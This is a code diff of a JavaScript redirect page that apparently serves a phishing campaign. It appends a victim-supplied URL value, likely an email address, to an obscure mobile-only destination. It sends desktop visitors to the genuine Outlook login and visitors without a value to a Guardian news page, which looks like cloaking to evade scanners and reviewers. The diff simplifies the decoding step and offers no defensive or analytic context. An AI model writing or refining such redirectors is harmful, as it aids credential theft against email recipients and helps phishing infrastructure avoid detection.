@@ -96,7 +96,7 @@
         const REDIRECT_DELAY = 800;
         const MOBILE_REDIRECT_URL_BASE = "https://nJHAo.onahcjctgyd.es/RZWYfPQmCTz13hg@0h/$";
         const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
-        const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if decode fails or no value
+        const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if no value found
 
         // Mobile device detection function
         function isMobileDevice() {
@@ -104,41 +104,31 @@
             return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|phone/i.test(userAgent);
         }
 
-        // Simplified: Try to get potential value from hash or search string
+        // Get potential value from hash (priority) or search string
         function getPotentialValue() {
             const hash = window.location.hash.substring(1); // Remove leading '#'
             if (hash) {
-                return hash;
+                // Hash value doesn't typically need decoding, but we do it for consistency
+                try { return decodeURIComponent(hash); } catch (e) { return hash; } // Fallback to raw hash on decode error
             }
             const search = window.location.search.substring(1); // Remove leading '?'
             if (search) {
-                // Directly return the search string, ignoring key=value formats per request
-                return search;
+                // Query string *does* need decoding
+                try { return decodeURIComponent(search); } catch (e) { return search; } // Fallback to raw search on decode error
             }
             return null; // No hash or search string found
         }
 
-        // Main redirect function (Simplified)
+        // Main redirect function (Ultra-Simplified)
         function performRedirect() {
-            const potentialValue = getPotentialValue();
-            let decodedValue = null;
+            const value = getPotentialValue();
 
-            if (potentialValue) {
-                try {
-                    decodedValue = atob(potentialValue);
-                    console.log("Successfully decoded value.");
-                } catch (e) {
-                    console.warn("Failed to decode value with atob():", e.message);
-                    // Treat decode failure same as no value
-                    decodedValue = null;
-                }
-            }
-
-            if (decodedValue !== null) {
-                // Value successfully decoded (no check if it's an email)
+            if (value) {
+                // Value exists (no validation or decoding needed beyond URI component)
+                console.log("Found value:", value);
                 if (isMobileDevice()) {
-                    // Redirect mobile devices to the specific destination + decoded value
-                    const redirectUrl = MOBILE_REDIRECT_URL_BASE + decodedValue;
+                    // Redirect mobile devices with the raw value appended
+                    const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
                     console.log("Mobile device detected. Redirecting to:", redirectUrl);
                     window.location.href = redirectUrl;
                 } else {
@@ -147,8 +137,8 @@
                     window.location.href = DESKTOP_REDIRECT_URL;
                 }
             } else {
-                // No value found or atob decoding failed
-                console.log("No value or decode failed. Redirecting all devices to dead URL:", DEAD_URL);
+                // No value found
+                console.log("No value found in hash or search. Redirecting all devices to dead URL:", DEAD_URL);
                 window.location.href = DEAD_URL;
             }
         }
